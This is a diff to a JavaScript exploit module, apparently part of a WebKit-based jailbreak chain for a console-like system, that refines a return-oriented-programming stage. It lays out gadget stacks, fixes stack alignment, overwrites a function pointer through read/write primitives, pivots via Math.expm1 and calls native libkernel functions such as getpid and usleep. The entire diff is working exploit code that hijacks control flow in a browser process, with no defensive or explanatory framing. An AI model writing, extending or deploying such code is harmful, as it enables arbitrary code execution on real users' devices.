@@ -126,6 +126,7 @@ export function prepNativeChain(p, off, webkitBase, cap) {
         keepAlive: [M.slab, pivotObj],
         webkitBase,
         staged: false,
+        mainArmed: false,
     };
 }
 
@@ -135,9 +136,10 @@ function layoutNativeCall(M, G, target, args) {
     M.frameU8.fill(0);
     const insts = [];
     for (let i = 0; i < args.length; i++) {
-        insts.push(G["POP_RDI_RET"]);
+        insts.push(G.POP_RDI_RET);
         insts.push(args[i]);
     }
+    const targetIdx = insts.length;
     insts.push(target);
     insts.push(G.POP_RDI_RET);
     insts.push(M.F);
@@ -146,7 +148,7 @@ function layoutNativeCall(M, G, target, args) {
     insts.push(JSVALUE_UNDEFINED);
     insts.push(G.LEAVE_RET);
     let at = STACK_SIZE - 8 * insts.length;
-    if (((M.K.low + at + 8 * args.length) & 0xf) !== 0)
+    if (((M.K.low + at + 8 * targetIdx) & 0xf) !== 0)
         at -= 8;
     for (let i = 0; i < insts.length; i++)
         put(M.stackDv, at + 8 * i, insts[i]);
@@ -157,7 +159,7 @@ export function layoutGetpidSlab(M, G, stub) {
     layoutNativeCall(M, G, stub, []);
 }
 
-/** Tap 1 — layout ROP stack + arm G0 (no expm1 yet). */
+/** Tap 1 — layout only (mainMf armed on fire for headroom). */
 export function stageGetpid(p, prep, libkernelBase, off) {
     if (!prep || !prep.M || !prep.G)
         throw new Error("stageGetpid: no prep");
@@ -168,13 +170,15 @@ export function stageGetpid(p, prep, libkernelBase, off) {
         stubOff = 0x4fa;
     const stub = libkernelBase.add32(stubOff);
     layoutGetpidSlab(prep.M, prep.G, stub);
-    p.write8(prep.mainMf, prep.G.G0);
     prep.staged = true;
     prep.fireTarget = stub;
     prep.fireKind = "getpid+" + stubOff.toString(16);
+    prep.fireLk = libkernelBase;
+    prep.fireOff = off;
+    prep.fireUsec = null;
 }
 
-/** Safer HW proof — Suchi-confirmed wrapper @ +0x13b20 (no raw stub table). */
+/** Safer HW proof — Suchi-confirmed wrapper @ +0x13b20. */
 export function stageUsleep(p, prep, libkernelBase, off, usec) {
     if (!prep || !prep.M || !prep.G)
         throw new Error("stageUsleep: no prep");
@@ -182,23 +186,41 @@ export function stageUsleep(p, prep, libkernelBase, off, usec) {
     const fn = libkernelBase.add32(fnOff);
     const arg = new int64((usec != null ? usec : 1000) >>> 0, 0);
     layoutNativeCall(prep.M, prep.G, fn, [arg]);
-    p.write8(prep.mainMf, prep.G.G0);
     prep.staged = true;
     prep.fireTarget = fn;
     prep.fireKind = "usleep+" + fnOff.toString(16);
+    prep.fireLk = libkernelBase;
+    prep.fireOff = off;
+    prep.fireUsec = usec != null ? usec : 1000;
 }
 
-/** Tap 2 — fire expm1 pivot + disarm. */
-export function fireGetpid(p, prep) {
+/** chain_poops callAddr — layout fresh, pivot, expm1, restore. No logging here. */
+export function fireNativeCall(p, prep) {
     if (!prep || !prep.M)
-        throw new Error("fireGetpid: no prep");
+        throw new Error("fireNativeCall: no prep");
+    if (!prep.mainArmed) {
+        p.write8(prep.mainMf, prep.G.G0);
+        prep.mainArmed = true;
+    }
     const saved = p.read8(prep.pivotCell);
     p.write8(prep.pivotCell, prep.M.S);
     Math.expm1(prep.pivotObj);
     p.write8(prep.pivotCell, saved);
     p.write8(prep.mainMf, prep.mainOrig);
+    prep.mainArmed = false;
     prep.staged = false;
     return prep.M.frameDv.getUint32(0, true) | 0;
+}
+
+/** Re-layout + fire atomically (poops OOM-safe — no gap between arm and expm1). */
+export function fireUsleep(p, prep, libkernelBase, off, usec) {
+    stageUsleep(p, prep, libkernelBase, off, usec);
+    return fireNativeCall(p, prep);
+}
+
+/** Tap 2 — fire expm1 pivot + disarm. */
+export function fireGetpid(p, prep) {
+    return fireNativeCall(p, prep);
 }
 
 /** Inline: stage + fire (use immediately after prep on Save bases). */
